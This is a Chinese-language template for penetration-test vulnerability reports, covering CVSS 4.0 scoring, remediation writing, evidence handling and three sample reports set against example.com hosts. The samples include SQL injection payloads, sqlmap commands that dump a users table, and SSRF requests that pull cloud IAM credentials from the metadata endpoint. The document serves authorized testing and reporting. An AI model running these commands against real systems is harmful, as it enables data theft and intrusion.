# 红队级商用渗透测试 — 漏洞报告提交模板

> 红队级商用渗透测试漏洞报告提交模板。所有报告须遵循三段式结构，附带 CVSS 4.0 评分、可执行重现步骤、"怎么打透"导向的修复建议。

---

## 一、三段式报告结构模板

### 1.1 标题模板
```
[{严重等级}] {漏洞类型} — {目标资产}:{endpoint/参数} ({认证上下文})
```
总长度不超过 80 字符，精确到 endpoint + 漏洞类型，标注认证上下文。
```
[严重] SQL注入 — api.example.com:/api/v1/orders/search?q= (未认证)
[高危] SSRF — internal-gw.example.com:/api/v1/fetch?url= (普通用户)
[中危] 未授权访问 — admin.example.com:/api/v1/users/list (未认证)
```

### 1.2 重现步骤模板
每步须可独立执行，包含完整 HTTP 请求包 / curl 命令 / 截图占位符。
```markdown
### 重现步骤
**前置条件：** 目标环境、测试账号、工具版本（Burp Suite / sqlmap）

**Step 1 — {动作描述}**
\```http
POST /api/v1/{endpoint} HTTP/1.1
Host: {target}
Authorization: Bearer {token}

{"param": "payload"}
\```
等价 curl：
\```bash
curl -X POST 'https://{target}/api/v1/{endpoint}' -H 'Authorization: Bearer {token}' -d '{"param":"payload"}'
\```
> 截图占位：`{日期}_{目标}_{漏洞类型}_step1.png`

**Step N — 验证结果**
{描述预期/实际返回，附响应截图占位}
```

### 1.3 影响 + 修复建议模板
```markdown
### 影响评估
**CVSS 4.0：** {分数} ({严重/高危/中危/低危})
\```
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N
\```
**业务影响：** {量化数据/资金/用户范围}
**攻击链推演：** {从该漏洞可进一步达成的目标}

### 修复建议
1. {修复项 — 具体到技术栈/配置/代码示例}
```

---

## 二、CVSS 4.0 评分指引

### 2.1 三组指标
**Base Metrics：** AV(N/A/L/P) / AC(L/H) / AT(N/P) / PR(N/L/H) / UI(N/P/A) / VC(H/L/N) / VI(H/L/N) / VA(H/L/N)
**Threat Metrics：** E — Exploit Maturity：X(未定义) / U(未证实) / P(PoC可用) / A(已被攻击)
**Environmental Metrics：** CR(H/M/L) / IR(H/M/L) / AR(H/M/L)

### 2.2 CVSS Vector 字符串示例
```
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/E:A/CR:H/IR:H/AR:M
```

### 2.3 各漏洞类型评分参考表
| 漏洞类型 | AV | AC | AT | PR | UI | VC | VI | VA | 分数 | 等级 |
|----------|----|----|----|----|----|----|----|----|------|------|
| SQL注入(脱库) | N | L | N | N | N | H | L | N | 8.7 | 高危 |
| SQL注入(写入) | N | L | N | N | N | H | H | H | 9.3 | 严重 |
| RCE | N | L | N | N | N | H | H | H | 9.3 | 严重 |
| SSRF(内网探测) | N | L | N | L | N | L | N | N | 5.4 | 中危 |
| SSRF(云元数据) | N | L | N | L | N | H | N | N | 7.1 | 高危 |
| 存储型XSS | N | L | N | N | P | L | L | N | 6.3 | 中危 |
| IDOR | N | L | N | L | N | H | N | N | 7.1 | 高危 |
| 文件上传(WebShell) | N | L | N | L | N | H | H | H | 8.7 | 高危 |
| 反序列化RCE | N | L | N | N | N | H | H | H | 9.3 | 严重 |
| 逻辑漏洞 | N | L | N | L | N | N | H | N | 6.6 | 中危 |

> 典型场景参考值，实际须根据攻击面、认证要求、数据敏感度调整。

---

## 三、"怎么打透"写法指引
修复建议不是写"别做什么"，而是写"怎么做到位"——具体技术方案 + 选型理由 + 落地方式。

### 五个"别做 → 怎么打透"改写示例

**1. 密码存储**
- 别做："不要存储明文密码。"
- 怎么打透："使用 Argon2id（内存=64MB，迭代=3，并行=4）哈希存储。若对称加密凭证，采用 AES-256-GCM，密钥由 KMS（AWS KMS / Vault）管理，严禁硬编码，轮换周期≤90天。"
**2. 越权修复**
- 别做："修复越权问题。"
- 怎么打透："API 网关层实施对象级授权（ABAC），每请求校验 `subject_id` 与 `resource.owner_id` 归属关系。策略集中管理（OPA / Casbin），Controller 前置 Middleware 强制执行，拒绝并记录审计日志。"
**3. SQL注入修复**
- 别做："不要拼接SQL语句。"
- 怎么打透："统一参数化查询（PreparedStatement / ORM 绑定），数据访问层封装 `safeQuery()`。CI 流水线引入静态扫描（Semgrep / CodeQL）拦截裸 SQL 拼接，设为构建阻断项。WAF 追加 ModSecurity CRS Level 2 纵深防御。"
**4. SSRF修复**
- 别做："不要让服务器直接请求用户输入的URL。"
- 怎么打透："构建 URL Fetch 代理：(1) DNS 解析后校验目标 IP 不在 RFC 1918 / 169.254 / 127.0 范围；(2) 出网代理域名白名单；(3) 禁止重定向跟随；(4) 响应限 1MB，超时 5s。"
**5. 文件上传修复**
- 别做："不要允许上传可执行文件。"
- 怎么打透："五层校验：(1) 前端白名单扩展名；(2) 后端 Magic Bytes 校验；(3) 沙箱重编码消除载荷；(4) 存储独立 OSS Bucket，设 `Content-Disposition: attachment`；(5) CDN 分发，源站不可直访。"

---

## 四、留证规范

### 4.1 证据包目录结构
```
evidence/{漏洞编号}/
├── poc/              # PoC 脚本 (exploit.py)
├── requests/         # 原始 HTTP 请求
├── responses/        # 原始 HTTP 响应
├── screenshots/      # 操作截图
├── data/             # 提取数据样本（脱敏后）
└── notes/            # 分析笔记 (analysis.md)
```

### 4.2 文件命名规则
```
{日期}_{目标}_{漏洞类型}_{序号}.{ext}
```
日期 `YYYYMMDD` | 目标 `api/admin/payment` | 类型 `sqli/ssrf/idor/rce/unauth/fileupload/deser/logic` | 序号 `step1` 或 `001` | 扩展名 `.txt/.png/.py/.csv`
示例：`20260807_api_sqli_step1.txt`

### 4.3 敏感数据打码规则
| 数据类型 | 打码方式 | 示例 |
|----------|----------|------|
| 手机号 | 保留前3后4 | `138****5678` |
| 身份证号 | 保留前3后4 | `110***********1234` |
| 银行卡号 | 保留前4后4 | `6222********1234` |
| 邮箱 | 保留首字母+域名 | `z***@example.com` |
| 密码/Token | 完全替换 | `{REDACTED_TOKEN}` |
| 真实姓名 | 保留姓氏 | `张**` |
| 地址 | 保留省市级 | `北京市朝阳区****` |

截图提交前完成打码；数据样本仅保留最小证明记录（3-5条）；原始未脱敏数据存储加密容器，测试后销毁。

### 4.4 PoC 脚本规范
```python
#!/usr/bin/env python3
"""漏洞编号:{VULN-ID} | 类型:{类型} | 目标:{target} | 日期:{YYYY-MM-DD}
用法: python3 exploit.py --target https://api.example.com --token {token}"""
import argparse, requests, sys
def exploit(target: str, token: str) -> bool:
    """验证漏洞存在性，返回 True 表示漏洞确认。"""
    resp = requests.post(f"{target}/api/v1/endpoint", json={"param": "payload"},
        headers={"Authorization": f"Bearer {token}"}, timeout=10, verify=False)
    if "EXPECTED_INDICATOR" in resp.text:
        print(f"[+] 漏洞验证成功 — HTTP {resp.status_code}"); return True
    print(f"[-] 未检测到漏洞特征 — HTTP {resp.status_code}"); return False
if __name__ == "__main__":
    p = argparse.ArgumentParser(description="PoC 验证脚本")
    p.add_argument("--target", required=True, help="目标URL")
    p.add_argument("--token", required=False, help="认证Token")
    a = p.parse_args(); sys.exit(0 if exploit(a.target, a.token) else 1)
```
须满足：自包含，依赖写入 `requirements.txt`；含 `--help`；仅验证性操作不破坏数据；输出 `[+]`/`[-]` 标识。

---
## 五、漏洞类型报告模板示例

### 5.1 SQL注入报告示例
```markdown
## [严重] SQL注入 — api.example.com:/api/v1/orders/search?q= (未认证)
### 漏洞概述
| 字段 | 值 |
|------|----|
| 目标/Endpoint/参数 | https://api.example.com / /api/v1/orders/search / q |
| 注入类型 | 布尔盲注 + 时间盲注 |
| 认证要求/发现日期 | 无 / 2026-08-07 |
### 重现步骤
**Step 1 — 确认注入点**
\```http
GET /api/v1/orders/search?q=' AND 1=1-- HTTP/1.1
Host: api.example.com
\```
\```http
GET /api/v1/orders/search?q=' AND 1=2-- HTTP/1.1
Host: api.example.com
\```
1=1 返回订单列表，1=2 返回空——确认布尔盲注。> 截图：`20260807_api_sqli_step1.png`
**Step 2 — sqlmap 验证**
\```bash
sqlmap -u "https://api.example.com/api/v1/orders/search?q=*" --batch --level=3 --risk=2 --technique=BT
\```
确认 MySQL 8.0，布尔盲注 + 时间盲注。> 截图：`20260807_api_sqli_step2.png`
**Step 3 — 提取数据样本**
\```bash
sqlmap -u "https://api.example.com/api/v1/orders/search?q=*" --batch -D ecommerce -T users --dump --start=1 --stop=3
\```
提取 3 条记录（已脱敏），含 `username`、`password_hash`。> 数据：`20260807_api_sqli_dump_sample.csv`
### 影响评估
**CVSS 4.0：** 8.7（高危）
\```
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/E:A/CR:H/IR:H/AR:M
\```
**业务影响：** `users` 表 120 万用户记录（手机号、密码哈希），泄露违反《个人信息保护法》；MySQL `FILE` 权限若开启可写 WebShell。
**攻击链推演：** SQL注入 → 脱取凭证表 → 撞库破解弱口令 → 横向渗透管理后台 → 全量数据控制
### 修复建议
1. **参数化查询**：`q` 改用 PreparedStatement 绑定。MyBatis：`WHERE title LIKE CONCAT('%', #{q}, '%')`，禁用拼接
2. **输入校验**：`q` 白名单（中英文+数字，≤50字符），API 网关 JSON Schema 校验
3. **纵深防御**：WAF 启用 ModSecurity CRS v4 SQLi（PL2）；数据库账户降权，禁用 `FILE`/`PROCESS`
```

### 5.2 SSRF报告示例
```markdown
## [高危] SSRF — internal-gw.example.com:/api/v1/fetch?url= (普通用户)
### 漏洞概述
| 字段 | 值 |
|------|----|
| 目标/Endpoint/参数 | https://internal-gw.example.com / /api/v1/fetch / url |
| SSRF类型 | 服务端发起请求，无内网IP过滤 |
| 认证要求/发现日期 | 普通用户Token / 2026-08-07 |
### 重现步骤
**Step 1 — 确认SSRF**
\```bash
curl -X GET 'https://internal-gw.example.com/api/v1/fetch?url=http://127.0.0.1:80/' -H 'Authorization: Bearer {token}'
\```
响应返回内网 Web 服务首页内容，确认 SSRF。> 截图：`20260807_internalgw_ssrf_step1.png`
**Step 2 — 探测内网端口**
\```bash
python3 poc/ssrf_scan.py --target https://internal-gw.example.com --token {token} --range 10.0.0.0/24 --ports 22,80,3306,6379,8080
\```
发现 `10.0.0.8`（Redis 6379 无密码）。> 截图：`20260807_internalgw_ssrf_step2.png`
**Step 3 — 窃取云元数据**
\```bash
curl -X GET 'https://internal-gw.example.com/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' -H 'Authorization: Bearer {token}'
\```
成功获取 IAM 临时凭证（已脱敏）。> 响应：`20260807_internalgw_ssrf_step3.txt`
### 影响评估
**CVSS 4.0：** 7.1（高危）
\```
CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/E:A/CR:H/IR:H/AR:M
\```
**业务影响：** 内网拓扑泄露（存活主机/端口/指纹）；云 IAM 凭证窃取可操控云资源；可访问无认证 Redis 写入恶意数据。
**攻击链推演：** SSRF → 发现无认证Redis → 写入SSH公钥 → 获取服务器权限 → 内网横向移动
### 修复建议
1. **URL Fetch 代理**：外部 URL 请求经专用代理发起，DNS 解析后校验目标 IP 不在 RFC 1918/169.254/127.0 范围
2. **域名白名单**：出网代理仅允许预配置白名单，由配置中心管理
3. **禁用重定向**：禁止 HTTP 3xx 跟随（或最大跳数=0），防止绕过 IP 校验
4. **云元数据防护**：安全组禁止访问 169.254.169.254，或启用 IMDSv2 Token 访问
```

### 5.3 未授权访问报告示例
```markdown
## [中危] 未授权访问 — admin.example.com:/api/v1/users/list (未认证)
### 漏洞概述
| 字段 | 值 |
|------|----|
| 目标/Endpoint | https://admin.example.com / /api/v1/users/list |
| 缺陷类型 | 缺少认证校验 |
| 认证要求/发现日期 | 无（应需管理员认证） / 2026-08-07 |
### 重现步骤
**Step 1 — 确认未授权访问**
\```bash
curl -X GET 'https://admin.example.com/api/v1/users/list?page=1&size=20'
\```
预期 401，实际 HTTP 200，返回用户列表（手机号、邮箱、角色）。> 截图：`20260807_admin_unauth_step1.png`
**Step 2 — 遍历数据量验证**
\```bash
curl -s 'https://admin.example.com/api/v1/users/list?page=1&size=100' | jq '.total'
\```
返回 `total: 1283500`，可分页遍历全量用户数据。> 截图：`20260807_admin_unauth_step2.png`
**Step 3 — 尝试其他管理接口**
\```bash
curl -X GET 'https://admin.example.com/api/v1/system/config'
\```
`/system/config` 同样未授权可访问，返回数据库连接信息（密码已脱敏）。> 响应：`20260807_admin_unauth_step3.txt`
### 影响评估
**CVSS 4.0：** 6.9（中危）
\```
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/E:U/CR:H/IR:H/AR:M
\```
**业务影响：** 可遍历 128 万用户记录（手机号、邮箱），违反《个人信息保护法》；`/system/config` 暴露数据库连接字符串、第三方密钥；若写入接口同样未授权可篡改数据。
**攻击链推演：** 未授权访问用户列表 → 获取管理员账号 → 撞库 → 管理后台权限 → 全系统控制
### 修复建议
1. **统一认证网关**：API 网关（Kong/APISIX）为所有 `/api/v1/*` 路由强制 JWT 认证插件，无有效 Token 直接返回 401
2. **RBAC 权限控制**：引入 Casbin，`/api/v1/users/*` 仅 `admin`、`/api/v1/system/*` 仅 `superadmin` 可访问
3. **接口最小暴露**：管理后台 API 与对外 API 域名隔离，仅 VPN/堡垒机访问，不暴露公网
4. **审计日志**：管理接口访问记录审计日志，接入 SIEM 实时告警
```

---

## 附录：报告提交检查清单
- [ ] 标题≤80字符，精确到endpoint+漏洞类型
- [ ] 重现步骤可独立执行，附HTTP包+curl+截图
- [ ] CVSS 4.0 Vector完整（Base+Threat+Environmental）
- [ ] 业务影响量化（用户量/数据量/资金风险）
- [ ] 修复建议"怎么打透"写法，具体到技术栈/配置
- [ ] 证据包目录完整，文件命名符合规范
- [ ] 敏感数据已打码，PoC脚本自包含非破坏性
